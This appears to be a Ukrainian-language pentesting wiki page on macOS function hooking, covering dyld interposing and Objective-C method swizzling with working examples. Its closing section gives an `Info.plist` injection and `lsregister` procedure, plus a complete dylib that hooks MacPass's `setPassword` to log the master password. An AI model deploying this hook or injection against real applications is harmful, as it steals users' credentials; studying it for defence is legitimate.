# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

Створіть **dylib** з секцією **`__interpose` (`__DATA___interpose`)** (або секцією, позначеною **`S_INTERPOSING`**), що містить кортежі **вказівників на функції**, які посилаються на **оригінальні** та **замінні** функції.

Потім **впровадьте** dylib за допомогою **`DYLD_INSERT_LIBRARIES`** (впровадження має відбуватися до завантаження основного додатку). Очевидно, що [**обмеження**, що застосовуються до використання **`DYLD_INSERT_LIBRARIES`**, також діють тут](macos-library-injection/#check-restrictions).

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> Змінна середовища **`DYLD_PRINT_INTERPOSTING`** може бути використана для налагодження інтерпозування і виведе процес інтерпозування.

Також зверніть увагу, що **інтерпозування відбувається між процесом і завантаженими бібліотеками**, воно не працює з кешем спільних бібліотек.

### Динамічне інтерпозування

Тепер також можливо динамічно інтерпозувати функцію, використовуючи функцію **`dyld_dynamic_interpose`**. Це дозволяє програмно інтерпозувати функцію під час виконання, а не лише з самого початку.

Просто потрібно вказати **кортежі** функції **для заміни та функції заміни**.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
## Method Swizzling

В ObjectiveC метод викликається так: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Потрібні **об'єкт**, **метод** та **параметри**. І коли метод викликається, **msg надсилається** за допомогою функції **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Об'єкт - це **`someObject`**, метод - це **`@selector(method1p1:p2:)`**, а аргументи - **value1**, **value2**.

Слідуючи структурам об'єктів, можна отримати **масив методів**, де **імена** та **вказівники** на код методу **знаходяться**.

> [!CAUTION]
> Зверніть увагу, що оскільки методи та класи доступні на основі їх імен, ця інформація зберігається в бінарному файлі, тому її можна отримати за допомогою `otool -ov </path/bin>` або [`class-dump </path/bin>`](https://github.com/nygard/class-dump)

### Accessing the raw methods

Можна отримати інформацію про методи, такі як ім'я, кількість параметрів або адреса, як у наступному прикладі:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Метод Swizzling з method_exchangeImplementations

Функція **`method_exchangeImplementations`** дозволяє **змінити** **адресу** **реалізації** **однієї функції на іншу**.

> [!CAUTION]
> Тому, коли викликається функція, **виконується інша**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> У цьому випадку, якщо **код реалізації легітимного** методу **перевіряє** **ім'я методу**, він може **виявити** це свізлінг і запобігти його виконанню.
>
> Наступна техніка не має цього обмеження.

### Свізлінг методів з method_setImplementation

Попередній формат дивний, оскільки ви змінюєте реалізацію 2 методів один з одного. Використовуючи функцію **`method_setImplementation`**, ви можете **змінити** **реалізацію** **методу на інший**.

Просто пам'ятайте, щоб **зберегти адресу реалізації оригінального** методу, якщо ви плануєте викликати його з нової реалізації перед перезаписом, оскільки пізніше буде значно складніше знайти цю адресу.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Методологія атак за допомогою хуків

На цій сторінці обговорювалися різні способи хукування функцій. Однак вони передбачали **виконання коду всередині процесу для атаки**.

Щоб це зробити, найпростіша техніка - це інжектувати [Dyld через змінні середовища або захоплення](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md). Однак, я вважаю, що це також можна зробити через [інжекцію Dylib процесу](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port).

Однак обидва варіанти **обмежені** **незахищеними** бінарними файлами/процесами. Перевірте кожну техніку, щоб дізнатися більше про обмеження.

Однак атака за допомогою хуків функцій є дуже специфічною, зловмисник робитиме це, щоб **вкрасти чутливу інформацію зсередини процесу** (якщо ні, ви просто зробили б атаку інжекції процесу). І ця чутлива інформація може бути розташована в завантажених користувачем додатках, таких як MacPass.

Отже, вектор атаки полягатиме в тому, щоб знайти вразливість або зняти підпис з програми, інжектувати змінну середовища **`DYLD_INSERT_LIBRARIES`** через Info.plist програми, додавши щось на зразок:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
і потім **перереєструвати** додаток:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
Додайте в цю бібліотеку код для хуків, щоб ексфільтрувати інформацію: паролі, повідомлення...

> [!CAUTION]
> Зверніть увагу, що в новіших версіях macOS, якщо ви **знімаєте підпис** з бінарного файлу програми і вона раніше виконувалася, macOS **більше не буде виконувати цю програму**.

#### Приклад бібліотеки
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Посилання

- [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

{{#include ../../../banners/hacktricks-training.md}}
